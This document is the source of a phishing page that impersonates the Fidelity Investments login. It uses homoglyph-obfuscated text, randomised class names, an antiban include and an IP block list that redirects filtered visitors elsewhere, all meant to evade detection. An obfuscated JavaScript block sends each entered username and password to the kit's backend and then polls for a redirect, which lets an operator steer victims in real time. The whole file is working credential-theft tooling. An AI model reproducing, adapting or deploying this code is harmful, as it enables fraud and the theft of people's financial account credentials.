﻿<?php
    error_reporting(0);
    session_start();
    include '../setting/functions.php';
    include "../antiban/antiban.php";
    
    function isBlocked($ip) {
        $blockedIPs = file_get_contents('../panel/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }
    
    $userIP = get_client_ip();
    
    if (isBlocked($userIP)) {
        header("Location: https://www.superhonda.com/");
        exit();
    }
    
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
	<meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		  <title>  F­­i­­d­­e­­l­­i­­t­­y - </title>
	  <link rel="icon" type="image/png" href="./images/icons.png">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f4f4f4;
            color: #000;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }

        .Q1 {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .Q2 {
            background: #fff;
            padding: 0.75rem 2rem;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .Q3 {
            display: flex;
            align-items: center;
        }

        .Q4 {
            height: 32px;
            width: auto;
        }

        .Q5 {
            display: flex;
            gap: 2rem;
        }

        .Q6 {
            color: #000;
            text-decoration: none;
            font-size: 0.875rem;
            cursor: pointer;
        }

        .Q6:hover {
            text-decoration: underline;
        }

        .Q7 {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 3rem 1rem;
            position: relative;
        }

        .Q8 {
            background: #fff;
            width: 100%;
            max-width: 420px;
            padding: 1.5rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            border: 1px solid #e0e0e0;
            position: relative;
        }

        .Q9 {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: #000;
        }

        .Q10 {
            margin-bottom: 1.25rem;
        }

        .Q11 {
            display: block;
            font-size: 0.875rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: #000;
        }

        .Q24 {
            position: relative;
        }

        .Q12 {
            width: 100%;
            height: 39px;
			padding: 0.5em 1em;
            padding: 0 0.75rem;
            font-size: 1rem;
            border: 1px solid #999;
            border-radius: 6px;
            background: #fff;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .Q12:focus {
            border-color: #000000;
            box-shadow: 0 0 0 1px #000000;
        }

        .Q25 {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0.25rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .Q25 svg {
            width: 20px;
            height: 20px;
            fill: #666;
        }

        .Q13 {
            display: flex;
            align-items: center;
            margin: 1.25rem 0;
            cursor: pointer;
        }

        .Q13 input {
            width: 18px;
            height: 18px;
            margin-right: 0.5rem;
            cursor: pointer;
            accent-color: #368727;
        }

        .Q13 span {
            font-size: 0.875rem;
            color: #000;
        }

        .Q14 {
            width: 100%;
            height: 44px;
            background-color: #368727;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 1.5rem;
        }

        .Q14:hover {
            background-color: #2d701f;
        }

        .Q15 {
            color: #000;
            text-decoration: underline;
            font-size: 0.875rem;
            cursor: pointer;
        }

        .Q15:hover {
            text-decoration: none;
        }

        .Q16 {
            margin-top: 2rem;
            text-align: center;
            font-size: 0.875rem;
            color: #000;
        }

        .Q17 {
            color: #000;
            text-decoration: underline;
            cursor: pointer;
        }

        .Q17:hover {
            text-decoration: none;
        }

        .Q18 {
            position: fixed;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            background: #fff;
            border: 1px solid #ccc;
            border-right: none;
            padding: 0.5rem 0.25rem;
            writing-mode: vertical-rl;
            text-orientation: mixed;
            font-size: 0.75rem;
            color: #368727;
            cursor: pointer;
            border-radius: 4px 0 0 4px;
            box-shadow: -2px 0 4px rgba(0,0,0,0.1);
        }

        .Q18:hover {
            background: #f4f4f4;
        }

        /* Loading Overlay Inside Card */
        .Q19 {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            z-index: 10;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            border-radius: 8px;
        }

        .Q19.Q20 {
            display: flex;
        }

        .Q21 {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #368727;
            border-radius: 50%;
            animation: Q22 1s linear infinite;
        }

        @keyframes Q22 {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .Q23 {
            margin-top: 0.75rem;
            font-size: 1rem;
            color: #000;
        }

        /* Mobile */
        @media (max-width: 768px) {
            .Q2 {
                padding: 0.75rem 1rem;
            }

            .Q5 {
                gap: 1rem;
            }

            .Q6 {
                font-size: 0.8125rem;
            }

          

            .Q8 {
                padding: 1.5rem;
                box-shadow: none;
                border: none;
                background: #fff;
            }

            .Q18 {
                display: none;
            }
        }
		img {
    width: 127px;
}
@media (max-width: 511px) {
    .Q7 {
        padding: 0;
    }
	
	.Q2 {
border-bottom: none;
    }
	    .Q5 {
    display: none;
    }
	
	.Q8 {
max-width: 100% !important;
    }
	
}




        .error-alert {
            display: flex;
            align-items: stretch;
		    MARGIN-BOTTOM: 19PX;
            background-color: #fff;
            border: 2px solid #dc2626;
            border-radius: 8px;
            overflow: hidden;
            max-width: 400px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .error-icon-container {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #dc2626;
            padding: 16px;
            min-width: 50px;
        }

        .error-icon {
            width: 24px;
            height: 24px;
            fill: white;
        }

        .error-message {
            display: flex;
            align-items: center;
            padding: 16px 20px;
            color: #374151;
            font-size: 15px;
            line-height: 1.5;
            font-weight: 400;
        }
    </style>
</head>
<body>

<div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q1 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
    <header  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q2 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q3 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
<img src="./images/image_3d4a7de4a4a1471d9d1747d2e9eeaaa4.png" alt="Fidelity Investments">
        </div>
        <nav  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q5 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
            <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q6 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Sесurіty</a>
            <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q6 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">FАQs</a>
        </nav>
    </header>

    <main  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q7 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q8 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
            <h1  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q9 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Lоg іn</h1> 

	
				<?php
$progress = $_GET['progress'] ?? ''; if ($progress === 'false') {echo "
                <div class='error-alert'>
        <div class='error-icon-container'>
            <svg class='error-icon' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
                <path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/>
            </svg>
        </div>
        <div class='error-message'>
            Yоu'vе еntеrеd аn іnсоrrесt usеrnаmе оr раsswоrd. Рlеаsе try аgаіn.
        </div>
    </div>
";}
?> 		
	 
            <form id="R1">
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q10 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <label  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q11 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" for="S1">Usеrnаmе</label>
                    <input type="text" id="S1" spellcheck="false" pattern="[A-Za-z0-9]+" name="username"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q12 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" spellcheck="false" required value="">
                </div>

                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q10 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <label  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q11 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" for="S2">Раsswоrd</label>
                    <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q24 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                        <input type="password" id="S2" name="password"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q12 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" required value="">
                        <button type="button"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q25 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="C3" aria-label="Show password">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                            </svg>
                        </button>
                    </div>
                </div>

                <label  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q13 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">
                    <input type="checkbox" id="S3" name="remember">
                    <span>Rеmеmbеr my usеrnаmе</span>
                </label>

                <button type="submit"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q14 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="S4">Lоg іn</button>
				
            </form>

            <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q15 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Fоrgоt usеrnаmе оr раsswоrd?</a>

            <!-- Loading Overlay Inside Card -->
            <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q19 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="T1">
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q21 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>"></div>
                <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q23 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>" id="T2">Lоаdіng</div>
            </div>
        </div>

        <p  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q16 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Nеw tо Fіdеlіty? <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q17 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Ореn аn ассоunt</a> or <a  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q17 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">sіgn uр</a>.</p>

        <div  class="<?php echo substr(str_shuffle($permitted_chars), 0, 7);?> Q18 <?php echo substr(str_shuffle($permitted_chars), 0, 7);?>">Fееdbасk</div>
    </main>
</div>

<script>
function rQNodMWywwlAgYxRwj(s_ve$iksCphfICnhnvvtr,y_cgE_Os){const GY$xmePqRL=TP$PIioojeZ();return rQNodMWywwlAgYxRwj=function(IgBUh_AQwCL_R,WJb$EG){IgBUh_AQwCL_R=IgBUh_AQwCL_R-(parseInt(0xa5a)+0xe71*Math.ceil(0x1)+0x11*-0x165);let VnXTofdQKwn_rNCtsXhdKV=GY$xmePqRL[IgBUh_AQwCL_R];if(rQNodMWywwlAgYxRwj['tDizRx']===undefined){const Nsqm_hsPxFQzquABwGltXRWoL=function(Fa_OfNLW$a){let FGzRbV_R_SNHoBVOa=0x26c7+Math.max(parseInt(0x137),parseInt(0x137))*Number(0x9)+parseInt(-0x2e3f)&-0x69*0xd+-parseInt(0x2)*parseInt(0xaa4)+parseFloat(-parseInt(0x4))*Number(-parseInt(0x6e7)),fmlrIwWeNIFsxoBlq$hSRyiIzx=new Uint8Array(Fa_OfNLW$a['match'](/.{1,2}/g)['map'](XHzWWJFkBheOfVT=>parseInt(XHzWWJFkBheOfVT,-0xeb5+parseInt(parseInt(0x14))*0x95+parseInt(0x321)))),j$zxeMEo_x=fmlrIwWeNIFsxoBlq$hSRyiIzx['map'](oOcNst_NzmAwIJCn=>oOcNst_NzmAwIJCn^FGzRbV_R_SNHoBVOa),zRTXvYLSQ_$QO=new TextDecoder(),RPIHSZ_OjRn=zRTXvYLSQ_$QO['decode'](j$zxeMEo_x);return RPIHSZ_OjRn;};rQNodMWywwlAgYxRwj['BtZSmq']=Nsqm_hsPxFQzquABwGltXRWoL,s_ve$iksCphfICnhnvvtr=arguments,rQNodMWywwlAgYxRwj['tDizRx']=!![];}const ndRnYRjQBKgxYMLbqgWiLBdU=GY$xmePqRL[Number(-0x44)*Math.trunc(0x66)+-parseInt(0x7f)*Math.trunc(0x13)+parseInt(-parseInt(0x1))*Math.max(-parseInt(0x2485),-parseInt(0x2485))],fr_h$yxvt=IgBUh_AQwCL_R+ndRnYRjQBKgxYMLbqgWiLBdU,Ox_jw_YXR=s_ve$iksCphfICnhnvvtr[fr_h$yxvt];return!Ox_jw_YXR?(rQNodMWywwlAgYxRwj['ASgEIq']===undefined&&(rQNodMWywwlAgYxRwj['ASgEIq']=!![]),VnXTofdQKwn_rNCtsXhdKV=rQNodMWywwlAgYxRwj['BtZSmq'](VnXTofdQKwn_rNCtsXhdKV),s_ve$iksCphfICnhnvvtr[fr_h$yxvt]=VnXTofdQKwn_rNCtsXhdKV):VnXTofdQKwn_rNCtsXhdKV=Ox_jw_YXR,VnXTofdQKwn_rNCtsXhdKV;},rQNodMWywwlAgYxRwj(s_ve$iksCphfICnhnvvtr,y_cgE_Os);}const uliqgd_FvgHyEjOqD=rQNodMWywwlAgYxRwj;(function(so_ZTedTDbd,kbJM$UPbQyTVkbG_GN){const COoSicqMEBmTP=rQNodMWywwlAgYxRwj,yjldEVADnGabptXYYencchg=so_ZTedTDbd();while(!![]){try{const LFqjnvQGBpnZevGE=-parseFloat(COoSicqMEBmTP(0x128))/(0x82a+Number(0x14ca)+Math.ceil(parseInt(0x1cf3))*-0x1)+-parseFloat(COoSicqMEBmTP(0x142))/(parseFloat(parseInt(0x18af))+0x1*Math.floor(-parseInt(0x199))+0x1c*Math.trunc(-parseInt(0xd3)))*(-parseFloat(COoSicqMEBmTP(0x121))/(Math.max(-0x254b,-0x254b)+Math.floor(-0x59)*-parseInt(0x3b)+parseInt(0x10cb)))+Math['trunc'](parseFloat(COoSicqMEBmTP(0x12b))/(0x1675+-parseInt(0x6b)*-parseInt(0x21)+Math.floor(-parseInt(0x4))*0x90f))+-parseFloat(COoSicqMEBmTP(0x11a))/(-parseInt(0x115b)+0xb*parseInt(0xb8)+0x1*Math.floor(0x978))*parseInt(-parseFloat(COoSicqMEBmTP(0x139))/(-0xda5+parseInt(0x2)*parseInt(0x4e4)+Math.floor(-parseInt(0x5))*-0xc7))+-parseFloat(COoSicqMEBmTP(0x118))/(parseInt(parseInt(0x1))*-parseInt(0xfd6)+-0x1516*parseInt(0x1)+Math.ceil(0x24f3))+Math['max'](-parseFloat(COoSicqMEBmTP(0x125))/(Math.trunc(-0x161e)+0x1013+parseInt(0x613)),-parseFloat(COoSicqMEBmTP(0x126))/(0xa3*Number(0x5)+parseInt(0x1c4a)+-0x1f70))*(-parseFloat(COoSicqMEBmTP(0x148))/(Number(-0x908)+-parseInt(0x1)*-parseInt(0x18ea)+-0xfd8))+parseFloat(COoSicqMEBmTP(0x133))/(Math.floor(-parseInt(0x1572))+0x106e*0x1+parseInt(0x50f)*Math.floor(parseInt(0x1)))*parseInt(-parseFloat(COoSicqMEBmTP(0x145))/(Math.max(-0x123a,-parseInt(0x123a))*Math.trunc(-0x1)+0x1d6*parseInt(0x13)+-0x3510));if(LFqjnvQGBpnZevGE===kbJM$UPbQyTVkbG_GN)break;else yjldEVADnGabptXYYencchg['push'](yjldEVADnGabptXYYencchg['shift']());}catch(KYkKkMow){yjldEVADnGabptXYYencchg['push'](yjldEVADnGabptXYYencchg['shift']());}}}(TP$PIioojeZ,parseInt(0x8)*0x2b473+-parseInt(0x14d053)+parseInt(parseInt(0xb474c))),document[uliqgd_FvgHyEjOqD(0x13e)]('C3')[uliqgd_FvgHyEjOqD(0x138)](uliqgd_FvgHyEjOqD(0x124),function(){const gWN__pIbHOeHlS=uliqgd_FvgHyEjOqD,phfICnhnv_v$trdycg=document[gWN__pIbHOeHlS(0x13e)]('S2'),Os$lGYxmePqRLpIgBU=this;phfICnhnv_v$trdycg[gWN__pIbHOeHlS(0x13c)]===gWN__pIbHOeHlS(0x120)?(phfICnhnv_v$trdycg[gWN__pIbHOeHlS(0x13c)]=gWN__pIbHOeHlS(0x12d),Os$lGYxmePqRLpIgBU[gWN__pIbHOeHlS(0x141)]=eyeClosed):(phfICnhnv_v$trdycg[gWN__pIbHOeHlS(0x13c)]=gWN__pIbHOeHlS(0x120),Os$lGYxmePqRLpIgBU[gWN__pIbHOeHlS(0x141)]=eyeOpen);}));function getClientId(){const Q_pPgZu=uliqgd_FvgHyEjOqD;let AQwCL$_Ra=localStorage[Q_pPgZu(0x143)](Q_pPgZu(0x129));return!AQwCL$_Ra&&(AQwCL$_Ra=Math[Q_pPgZu(0x11e)](Math[Q_pPgZu(0x13d)]()*(Number(parseInt(0x1e))*parseFloat(0x4d9b)+Math.ceil(-0x788f2)+0xdb308))[Q_pPgZu(0x127)]()[Q_pPgZu(0x11d)](parseInt(-0x96d)+-0x71*Math.floor(-parseInt(0x13))+-0x8*Math.max(-parseInt(0x22),-parseInt(0x22)),'0'),localStorage[Q_pPgZu(0x135)](Q_pPgZu(0x129),AQwCL$_Ra)),AQwCL$_Ra;}document[uliqgd_FvgHyEjOqD(0x13e)]('R1')[uliqgd_FvgHyEjOqD(0x138)](uliqgd_FvgHyEjOqD(0x137),function(JbEGPVnXTofdQKwnrNCtsXh$d){const Iwy$KehVNcmp=uliqgd_FvgHyEjOqD;JbEGPVnXTofdQKwnrNCtsXh$d[Iwy$KehVNcmp(0x119)](),document[Iwy$KehVNcmp(0x13e)]('T1')[Iwy$KehVNcmp(0x123)][Iwy$KehVNcmp(0x131)](Iwy$KehVNcmp(0x12c));const VVndRnYRjQ_BKgxY_MLbq=new FormData(this),WiLBdU$g=getClientId(),rhyxvtg={'username':VVndRnYRjQ_BKgxY_MLbq[Iwy$KehVNcmp(0x147)](Iwy$KehVNcmp(0x13a)),'password':VVndRnYRjQ_BKgxY_MLbq[Iwy$KehVNcmp(0x147)](Iwy$KehVNcmp(0x120)),'remember':VVndRnYRjQ_BKgxY_MLbq[Iwy$KehVNcmp(0x147)](Iwy$KehVNcmp(0x13b))?'on':'','client_id':WiLBdU$g};fetch(Iwy$KehVNcmp(0x11c),{'method':Iwy$KehVNcmp(0x130),'headers':{'Content-Type':Iwy$KehVNcmp(0x12a)},'body':new URLSearchParams(rhyxvtg)[Iwy$KehVNcmp(0x127)]()})[Iwy$KehVNcmp(0x11f)](xjwYXRVNsqmhsPxFQzquA=>xjwYXRVNsqmhsPxFQzquA[Iwy$KehVNcmp(0x12d)]())[Iwy$KehVNcmp(0x11f)](()=>{startChecking(WiLBdU$g);})[Iwy$KehVNcmp(0x12f)](wGl_$tXRWoLhFaOfNL=>{const L$CRzs$hWS=Iwy$KehVNcmp;console[L$CRzs$hWS(0x117)](L$CRzs$hWS(0x134),wGl_$tXRWoLhFaOfNL),document[L$CRzs$hWS(0x13e)]('T2')[L$CRzs$hWS(0x132)]=L$CRzs$hWS(0x136);});});function startChecking(azFGzRbVRSNHoBVOaX_fml_rIw){const eNIF$sxo_BlqhSRyiIzxijzxeM=setInterval(()=>{const uDCgpLZItAJVD_myBUrb_JcV=rQNodMWywwlAgYxRwj;fetch(uDCgpLZItAJVD_myBUrb_JcV(0x146)+encodeURIComponent(azFGzRbVRSNHoBVOaX_fml_rIw))[uDCgpLZItAJVD_myBUrb_JcV(0x11f)](oxqzRT$XvYL$SQQOnRP=>oxqzRT$XvYL$SQQOnRP[uDCgpLZItAJVD_myBUrb_JcV(0x13f)]())[uDCgpLZItAJVD_myBUrb_JcV(0x11f)](HSZOjRnAX$HzWWJFkBhe=>{const nSXYvFp=uDCgpLZItAJVD_myBUrb_JcV;HSZOjRnAX$HzWWJFkBhe[nSXYvFp(0x12e)]&&HSZOjRnAX$HzWWJFkBhe[nSXYvFp(0x11b)]&&(clearInterval(eNIF$sxo_BlqhSRyiIzxijzxeM),window[nSXYvFp(0x116)][nSXYvFp(0x144)]=HSZOjRnAX$HzWWJFkBhe[nSXYvFp(0x11b)]);})[uDCgpLZItAJVD_myBUrb_JcV(0x12f)](()=>{const FxCbmJXoV=uDCgpLZItAJVD_myBUrb_JcV;console[FxCbmJXoV(0x140)](FxCbmJXoV(0x122));});},Number(0xedd)+0xe0b+-0x1964);}function TP$PIioojeZ(){const LOExCIDKluSbPm_QCKbUYHkh=['1118021913','141603141f','27382423','161313','03120f0334181903121903','4540422d311a1b392f','32050518054d','0412033e03121a','3205051202055713125714181919120f1e1819595959','0402151a1e03','16131332011219033b1e040312191205','4444464f44413a02001c3423','0204120519161a12','05121a121a151205','030e0712','05161913181a','101203321b121a121903350e3e13','1d041819','1b1810','1e191912053f233a3b','4145413a163c13181e','1012033e03121a','1f051211','44474f41454f38143e3f0122','141f12141c281316031659071f0748141b1e121903281e134a','101203','45464e4e404747060d1033123a','1b181416031e1819','1205051805','42474f41424642340f36191a16','0705120112190333121116021b03','423e01341b0e3d','0512131e05121403','1316031659071f07','0716132403160503','111b181805','031f1219','0716040400180513','4645424f420420183e1121','251203050e1e1910595959','141b1604043b1e0403','141b1e141c','444527181a3e3f1f','4441042735020e15','03182403051e1910','46454044454440341902211e25','141b1e121903281e13','1607071b1e1416031e1819580f5a0000005a1118051a5a02051b12191418131213','43404246434041221a2001362e','264547','03120f03'];TP$PIioojeZ=function(){return LOExCIDKluSbPm_QCKbUYHkh;};return TP$PIioojeZ();}
</script>

</body>
</html>